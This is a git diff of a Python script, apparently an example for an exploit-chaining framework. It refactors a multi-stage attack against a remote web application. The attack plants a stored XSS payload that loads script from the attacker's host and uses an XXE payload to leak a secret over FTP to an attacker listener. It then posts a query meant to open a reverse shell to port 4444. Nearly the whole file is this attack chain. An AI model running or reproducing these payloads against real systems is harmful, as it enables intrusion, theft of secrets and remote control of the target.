@@ -1,7 +1,5 @@
 #!/usr/bin/env python3
 
-import os
-
 import requests
 
 from horrors import (
@@ -11,48 +9,50 @@ from horrors import (
 )
 
 
-async def plant_xss(scenario):
-    """Post XSS payload
+class PlantXSS(scenarios.Scene):
 
-    """
-    await scenario.http_post(
-        'http://{rhost}:{rport}/test/'.format(**scenario.context),
-        'field=<script src=http://{lhost}:{lport_http}/xss.js></script>'.format(**scenario.context),
-        scenario.context['post_headers'],
-    )
+    async def task(self):
+        """Post XSS payload"""
 
-
-async def get_new_account(scenario):
-    """Wait for `xss` event triggered when request path contains `xss.js`
-
-    """
-    result = await scenario.http_get(
-        'http://{rhost}:{rport}/userid/{username}'.format(**scenario.context)
-    )
-    scenario.context['userid'] = result['content'].decode()
-    return 'userid'
+        await self.http_post(
+            'http://{rhost}:{rport}/test/'.format(**self.context),
+            'field=<script src=http://{lhost}:{lport_http}/xss.js></script>'.format(**self.context)
+        )
 
 
-async def send_xxe(scenario):
-    """Post XXE payload using value `userid` stored in local context
+class GetNewAccount(scenarios.Scene):
 
-    """
-    await scenario.http_post(
-        'http://{rhost}:{rport}/xml-import/'.format(**scenario.context),
-        '<?xml version="1.0" ?><something evil="{userid}">ftp://{lhost}:{lport_ftp}</something>'.format(**scenario.context),
-        scenario.context['post_headers'],
-    )
+    on_finish = 'userid'
+
+    async def task(self):
+        """Wait for `xss` state triggered when request path contains `xss.js`"""
+
+        result = await self.http_get(
+            'http://{rhost}:{rport}/userid/{username}'.format(**self.context)
+        )
+        self.context['userid'] = result['content'].decode()
 
 
-async def reverse_shell(scenario):
-    """Wait for `xxe` event triggered when remote client connects via FTP and sends the secret
+class SendXXE(scenarios.Scene):
 
-    """
-    await scenario.http_post(
-        'http://{rhost}:{rport}/query/'.format(**scenario.context),
-        'secret={secret}&query=DROP+TABLE+IF+EXISTS+[...]{lhost}+{lport_reverse}'.format(**scenario.context),
-        scenario.context['post_headers'],
-    )
+    async def task(self):
+        """Post XXE payload using value `userid` stored in local context"""
+        
+        await self.http_post(
+            'http://{rhost}:{rport}/xml-import/'.format(**self.context),
+            '<?xml version="1.0" ?><something evil="{userid}">ftp://{lhost}:{lport_ftp}</something>'.format(**self.context)
+        )
+
+
+class ReverseShell(scenarios.Scene):
+
+    async def task(self):
+        """Wait for `xxe` state triggered when remote client connects via FTP and sends the secret"""
+
+        await self.http_post(
+            'http://{rhost}:{rport}/query/'.format(**self.context),
+            'secret={secret}&query=DROP+TABLE+IF+EXISTS+[...]{lhost}+{lport_reverse}'.format(**self.context)
+        )
 
 
 if __name__ == "__main__":
@@ -64,24 +64,24 @@ if __name__ == "__main__":
         'lport_reverse': 4444,
         'lport_ftp': 2121,
         'username': 'evil',
-        'post_headers': {'Content-Type': 'application/x-www-form-urlencoded'},
     }
 
-    story = scenarios.Scenario(**context)
-    # story.set_proxy('http://127.0.0.1:8080')  # In case you'd like to watch it live
-
-    httpd = services.HTTPStatic(story)
+    httpd = services.HTTPStatic()
     httpd.add_route('/', 'This is home page...')
-    httpd.add_route('/xss.js', open(os.path.join(os.path.dirname(__file__), 'xss.js')).read().format(**context))
+    httpd.add_route('/xss.js', open('xss.js').read().format(**context))
     httpd.add_route('/timestamp', services.HTTPStatic.timestamp)
     httpd.add_event('xss', when=events.PathContains('xss.js'))
 
-    ftpd = services.FTPReader(story)
+    ftpd = services.FTPReader()
     ftpd.add_event('xxe', when=events.DataMatch(r'.+SecretKey=(.+);', in_context='secret'))
 
-    story.add_scene(plant_xss)
-    story.add_scene(get_new_account, when='xss')
-    story.add_scene(send_xxe, when='userid')
-    story.add_scene(reverse_shell, when='xxe')
+    story = scenarios.Scenario(**context)
+    # story.set_proxy('http://127.0.0.1:8080')  # In case you'd like to watch it live
+    story.add_service(httpd)
+    story.add_service(ftpd)
+    story.add_scene(PlantXSS)
+    story.add_scene(GetNewAccount, when='xss')
+    story.add_scene(SendXXE, when='userid')
+    story.add_scene(ReverseShell, when='xxe')
     # story.set_debug()
     story.play()
